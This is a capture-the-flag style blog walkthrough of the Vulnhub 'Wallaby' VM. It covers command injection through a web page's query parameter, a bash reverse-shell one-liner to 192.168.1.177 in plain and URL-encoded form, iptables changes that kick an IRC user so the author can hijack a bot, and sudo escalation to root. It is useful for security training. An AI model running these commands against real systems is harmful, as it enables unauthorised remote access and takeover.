+++
menu = "posts"
Description = "A walkthrough of the Wallaby VM from Vulnhub"
date = "2016-12-30T19:16:02-04:00"
title = "B2R: Wallaby Walkthrough"
Categories = [ "Boot2Root" ]
+++

## Executive Summary

This machine had an unlisted but open webapp path that allowed for remote command execution. After
establishing a reverse shell as the limited user `www-data`, privilege checks showed the user was allowed to
modify firewall rules. There was also an IRC server that contained a bot that allowed command execution
through the use of the `.run` command. The command would only obey the user `waldo` so modification of the
firewall allows an attacker to kick and assume the `waldo` identity. Now the `.run` command could be run and
a reverse shell with the user `wallaby` could be established. `wallaby` had password-less sudo access, so
elevating to the root user was trivial.


## Tools Used

* nmap - service enumeration
* uniscan - webapp scanner


## Proof of Concept

Upon enumerating available services with nmap, I discovered two ports, 22 and 80. I began to scan with
`uniscan` but this failed and caused the VM to move the web application to a different port. It appeared that
automated tools were going to make this challenge harder, not easier.

After another scan, we find our new port:

![](https://i.imgur.com/U7eKOCh.png)
![](https://i.imgur.com/xuPADKd.png)


Various sorts of manual testing gave us different messages:

![](https://i.imgur.com/WwMxNnj.png)
![](https://i.imgur.com/IS2BlBh.png)

At this point, I decided to automate my enumeration of pages with a custom script.

~~~bash.prettyprint
for word in $(cat /usr/share/dirb/wordlists/common.txt); do
    
    # find pages whose last line does NOT contain the phrase 'what are you trying' ( a 404, essentially )
    curl -q "vm:60080/?page=$word" 2>/dev/null | tail -1 | grep -v 'what are you trying'

    if [[ $? -eq 0 ]]; then
        #if the last command command completed succesfully, print the word we foun
        echo $word
    fi
done | grep -v "/" # don't print results with slashes in them, they're false positives
~~~

This output yielded the pages.

~~~bash.prettyprint
contact
mailer
home
index
blacklist
name
~~~

The most interesting page here was `mailer`:

![](https://i.imgur.com/TNJEtuI.png)

I attempted to see if the `mail` query parameter actually passed through as a system command. It did:

![](https://i.imgur.com/9Yu6Zky.png)

From here we can set up a listener and run a reverse shell by feeding in url encoded commands to the `mail`
query parameter:

~~~bash.prettyprint
bash -c "bash -i >& /dev/tcp/192.168.1.177/443 0>&1"

# becomes

bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.177%2F443%200%3E%261%22
~~~

![](https://i.imgur.com/tWhvBSP.png)

Enumerating this user's privileges and networking, we determine that we have control of firewall rules,
there's a rule blocking incoming requests to port 6667, and that there's an IRC server running locally.

![](https://i.imgur.com/1slTkmg.png)

![](https://i.imgur.com/uxK21ov.png)


We can clear the firewall rules with `sudo iptables -F` and connect to the IRC server from the attacking
machine.

![](https://i.imgur.com/b0NDIKS.png) 

![](https://i.imgur.com/IoX9DnK.png) 

If we try to run the `.run` command, `wallabysbot` refuses.

![](https://i.imgur.com/R5Vwo3f.png) 

The code for the and configs for the bot are located in `/home/wallaby/.sopel` and it indicates that we need
to assume the nickname `waldo` in order for us to be able to use this command. We can't do that while waldo
is still logged in so we boot them off with the use of our firewall.

~~~bash.prettyprint
sudo iptables -I OUTPUT -p tcp -m owner --uid-owner 1000 --dport 6667 -s 127.0.0.1 -j DROP
~~~

![](https://i.imgur.com/KCH7TX6.png)

In a while, after a timeout, only `waldo` should be ejected from the room, leaving the ability to steal his
nick and command the bot.

![](https://i.imgur.com/1TnwYcT.png)


With a reverse shell established, we can see that the wallaby user has full, passwordless `sudo` access. From
here, it's just one command to `root`

![](https://i.imgur.com/Ds0KVYg.png)


Thanks to Waldo and Vulnhub for this frustrating but entertaining VM!



## Additional Information

* User `waldo` is running irssi within a tmux session. The socket is located in `/tmp/tmux-1000`
* There exists an irssi DoS vulnerability that could have been used to boot the `waldo` user to assume
  control of the bot.
* The `.py` modules (which runs python commands), at the time of this writing makes an external call to an
  out-of-scope API. It does not run the python command on the target machine. 
* There are at least 3 ways to get a limited shell and at least 2 to get root.

